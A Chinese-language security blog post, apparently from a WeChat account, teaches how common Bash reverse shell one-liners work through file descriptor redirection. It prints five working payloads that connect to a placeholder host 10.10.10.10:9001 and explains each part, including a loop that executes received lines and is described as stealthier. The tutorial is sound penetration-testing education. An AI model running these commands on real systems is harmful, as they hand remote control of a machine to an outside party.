---
title: 拆解那些千奇百怪的反向Shell命令
url: https://mp.weixin.qq.com/s/lirzKK7CKdPzzG6I4cI1pA
source: Doonsec's feed
date: 2026-07-12
fetch_date: 2026-07-13T05:29:43.767612
---

# 拆解那些千奇百怪的反向Shell命令

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/tbTbtBE6TibeOHe3ibzz91AvcLZ8JnL4EB86ubvRqKLRlicLmib9KxcKyic6ISwaKLlVwC8ebt3JV22iazqYicyTkwqWge1fvmU5xCRWceBVyGyZRQ/0?wx_fmt=jpeg)

# 拆解那些千奇百怪的反向Shell命令

幻泉之洲

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

> 渗透测试中拿到命令注入点后，反向Shell是控守目标的命门。revshells.com这类项目收集了大量payload，但很少有人把每条命令背后的文件描述符魔术讲透。这篇文章逐一拆解常见的Bash反向Shell写法，看完你就不会再盲目复制粘贴了。

## 什么是反向Shell

说白了，反向Shell就是让受害机器主动连回来，把它的命令行输入输出都交到你手上。正常的Shell是你连过去操作，反向Shell是它来找你。圈里也管这招叫“shell shoveling”——把Shell铲过来。

你不需要直接接触目标的终端，只要它执行一段精心构造的命令，你就能远程发号施令。这才是后渗透阶段最常用的驻留手法。

## 基础：文件描述符

搞懂反向Shell之前，先得把文件描述符（FD）这关过了。任何Unix系统上，每个进程默认开着三个FD：

* 0 — STDIN，标准输入
* 1 — STDOUT，标准输出
* 2 — STDERR，标准错误

FD本质上就是内核给进程开的一条I/O通道，可能连着文件、网络socket、管道、终端等等。除了这三个默认的，你还可以自己定义新的FD，后面会看到怎么用。

## 拆解常见Payload

### Bash -i 最经典版

sh -i >& /dev/tcp/10.10.10.10/9001 0>&1

这条命令几乎每个渗透测试人都背得下来。拆开看：

* `sh -i` — 用sh启动一个交互式Shell。sh通常软链到bash、dash之类的实际解释器。
* `>&` — 把标准输出和标准错误一并重定向。后面跟的目标是TCP连接。
* `/dev/tcp/10.10.10.10/9001` — Bash的伪设备文件，执行这行就会向指定IP和端口发起TCP连接。不是所有发行版都编译了这个特性，但多数CTF环境默认支持。
* `0>&1` — 把标准输入也绑到标准输出指向的同一个地方，也就是那条TCP连接。这样输入输出就全双向打通了。

整条命令的效果：目标机器上的sh进程，它的输入来自你的监听端，输出也回到你这边。你敲什么命令，它就执行什么。

### Bash 196 文件描述符玩法

0<&196;exec 196<>/dev/tcp/10.10.10.10/9001; sh <&196 >&196 2>&196

这个变体用到了自定义FD，号码196是随便挑的。三个子命令用分号串起来，不管前面成败，挨个执行：

* `0<&196;` — 让标准输入（FD 0）从196这个FD读。但196还没定义，这步只是先占个坑。
* `exec 196<>/dev/tcp/10.10.10.10/9001;` — exec直接在当前进程里打开一个读写FD（196），连到目标TCP。注意`<>`表示读写模式，不是只读或只写。
* `sh <&196 >&196 2>&196` — 启动交互式sh，并把它的输入、输出、错误全部绑到196，也就是那条TCP连接。

和上一种比，这种写法更刻意展示了FD的操控，不怕被某些安全配置误杀。

### Bash 逐行读取执行

exec 5<>/dev/tcp/10.10.10.10/9001;cat <&5 | while read line; do $line 2>&5 >&5; done

这条风格迥异：它不直接给你一个交互Shell，而是把TCP连接里收到的每一行文本当命令执行，再把输出吐回去。

* `exec 5<>/dev/tcp/10.10.10.10/9001` — 建一个读写FD 5，连到目标。
* `cat <&5` — 从FD 5不停地读数据。
* `| while read line; do $line 2>&5 >&5; done` — 管道的妙用：逐行读入变量line，直接`$line`执行，然后把标准错误和标准输出都重定向回FD 5。

这种非交互式的方式，在某些受限环境里反而更隐蔽，因为没有创建传统PTY。不过缺点是不能直接使用vim这类需要终端交互的程序。

### Bash 5 更简洁的FD绑定

sh -i 5<> /dev/tcp/10.10.10.10/9001 0<&5 1>&5 2>&5

和前面196版本本质一样，只是把FD打开和绑定写得更紧凑。直接用`sh -i 5<> /dev/tcp/...`，把读写FD 5创建出来，然后0、1、2全部指向5。如果你嫌196版本太长，这个就够用。

### Bash UDP 版本

sh -i >& /dev/udp/10.10.10.10/9001 0>&1

和经典TCP版本唯一的区别就是把`/dev/tcp`换成了`/dev/udp`。Bash同样支持UDP伪设备，但UDP无连接的特性会让这种Shell的稳定性大打折扣。丢包、乱序都可能导致命令执行错乱。实际渗透中几乎没人用，更多是出现在CTF的偏门考点里。

## 写在后面

这些payload看似五花八门，核心无非就是文件描述符的重定向与复用。掌握FD的玩法，你甚至可以自己随手写出适合特殊场景的变体。有人说反向Shell只是复制粘贴，但真正理解后你会发现，一条命令里藏着Unix进程模型的精巧设计。

复习材料：

哈佛CS61关于文件描述符的参考 https://cs61.seas.harvard.edu/site/ref/file-descriptors/#gsc.tab=0

Linux文档项目中对/dev/tcp和/dev/udp的说明 https://tldp.org/LDP/abs/html/devref1.html

维基百科文件描述符条目 https://en.wikipedia.org/wiki/File\_descriptor

GNU Bash手册关于读写FD的章节 https://www.gnu.org/savannah-checkouts/gnu/bash/manual/bash.html#Opening-File-Descriptors-for-Reading-and-Writing

---

### 参考资料

[1] https://adityatelange.in/blog/revshells/

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/KK6rkaWbMNbNvNRWVlQ1KyqceSk3WZAqKUsEjFj2Mfib1H7RQOOarzKolWvdD1W3PGicFOEABZLLpNoL2u9RdAXg/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过